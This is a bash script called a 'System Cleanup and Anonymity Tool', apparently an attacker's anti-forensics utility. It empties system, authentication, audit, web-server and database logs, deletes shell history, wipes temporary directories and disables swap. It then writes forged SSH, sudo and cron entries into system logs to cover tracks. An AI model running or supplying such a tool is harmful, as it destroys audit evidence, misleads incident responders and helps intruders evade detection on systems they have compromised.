#!/usr/bin/env bash

# Clear the screen
clear

# VARIABLES

# Colors (using a more muted color scheme)
BLACK="\e[30m"
WHITE="\e[97m"
GRAY="\e[90m"
NE="\e[0m"           # No color

# Symbols
INFO="${WHITE}[INFO]${NE}"
SUCCESS="${WHITE}[SUCCESS]${NE}"
ERROR="${WHITE}[ERROR]${NE}"
ARROW="${WHITE}➜${NE}"

# Timestamp function for logs
timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

# FUNCTIONS

# Progress bar
progress_bar() {
    local total=25  # Total squares in the bar
    local delay=0.003  # Delay in seconds
    local current=0  # Current progress

    # Print the progress bar incrementally
    while [ $current -le $total ]; do
        # Create the progress string
        local filled=$(printf '█%.0s' $(seq 1 $current))
        local empty=$(printf ' %.0s' $(seq 1 $((total - current))))

        # Display the progress bar
        echo -ne "Progress: [${filled}${empty}] \r"

        sleep $delay
        ((current++))
    done

    # Finish the bar
    echo -e "Progress: [$(printf '█%.0s' $(seq 1 $total))] Complete"
}

# Banner function with government-like tone
banner() {
    clear
    echo -e "${WHITE}----------------------------------------${NE}"
    echo -e "${WHITE}    System Cleanup and Anonymity Tool   ${NE}"
    echo -e "${WHITE}      Created By Hextass Group          ${NE}"
    echo -e "${WHITE}----------------------------------------${NE}"
    echo -e ""
}

# Function to remove logs
clean_logs() {
    echo -e "${WHITE}[$(timestamp)] Starting log cleanup...${NE}\n"
    logs=(
        "/var/log/auth.log"
        "/var/log/secure"
        "/var/log/syslog"
        "/var/log/messages"
        "/var/log/lastlog"
        "/var/log/wtmp"
        "/var/log/btmp"
        "/var/log/apache2/access.log"
        "/var/log/apache2/error.log"
        "/var/log/nginx/access.log"
        "/var/log/nginx/error.log"
        "/var/log/cron"
        "/var/log/kern.log"
        "/var/log/audit/audit.log"
        "/var/log/mysql/"
        "/var/log/postgresql/"
    )

    progress_bar

    for logfile in "${logs[@]}"; do
        if [ -f "$logfile" ]; then
            >"$logfile"
            echo -e "${ARROW} Emptied: $logfile"
        fi
    done

    echo -e "${SUCCESS} Log cleanup complete.${NE}\n"
}

# Function to clear command history
clear_history() {
    echo -e "${WHITE}[$(timestamp)] Clearing command history...${NE}"
    history -c && history -w
    rm -f ~/.bash_history ~/.zsh_history
    echo -e "${SUCCESS} Command history cleared.${NE}\n"
}

# Function to wipe temporary files
wipe_temp_files() {
    echo -e "${WHITE}[$(timestamp)] Wiping temporary files...${NE}"
    progress_bar
    rm -rf /tmp/* /var/tmp/*
    echo -e "${SUCCESS} Temporary files wiped.${NE}\n"
}

# Function to clear swap space
clear_swap() {
    echo -e "${WHITE}[$(timestamp)] Checking and clearing swap space...${NE}"

    if grep -q "swap" /proc/swaps; then
        sudo swapoff -a
        echo -e "${SUCCESS} Swap space cleared.${NE}\n"
    else
        echo -e "${INFO} No swap space detected.${NE}\n"
    fi
}

# Function to generate fake logs (more realistic and professional logs)
generate_fake_logs() {
    echo -e "${WHITE}[$(timestamp)] Generating fake logs for testing...${NE}"
    fake_logs=(
        "/var/log/auth.log"
        "/var/log/syslog"
        "/var/log/messages"
        "/var/log/cron"
    )

    progress_bar

    for logfile in "${fake_logs[@]}"; do
        echo -e "${ARROW} Writing to: $logfile"
        echo "Jan 18 12:34:56 server sshd[12345]: Accepted password for user from 192.168.1.1 port 2222 ssh2" >>"$logfile"
        echo "Jan 18 12:35:10 server sudo:    user : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/ls" >>"$logfile"
        echo "Jan 18 12:36:20 server cron: (root) CMD (/usr/bin/updatedb)" >>"$logfile"
    done

    mkdir /var/log/apache2
    bash modules/loggen

    echo -e "${SUCCESS} Fake logs generated.${NE}"
}

# Function to execute all tasks
full_cleanup_and_fake_logs() {
    echo -e "${WHITE}[$(timestamp)] Starting full cleanup and log generation...${NE}"
    clean_logs
    clear_history
    wipe_temp_files
    clear_swap
    generate_fake_logs
    echo -e "\n${SUCCESS} Full cleanup and log generation complete.${NE}\n"
}

# MAIN FUNCTION
main() {
    banner
    full_cleanup_and_fake_logs
}

# Execute Main Function
main

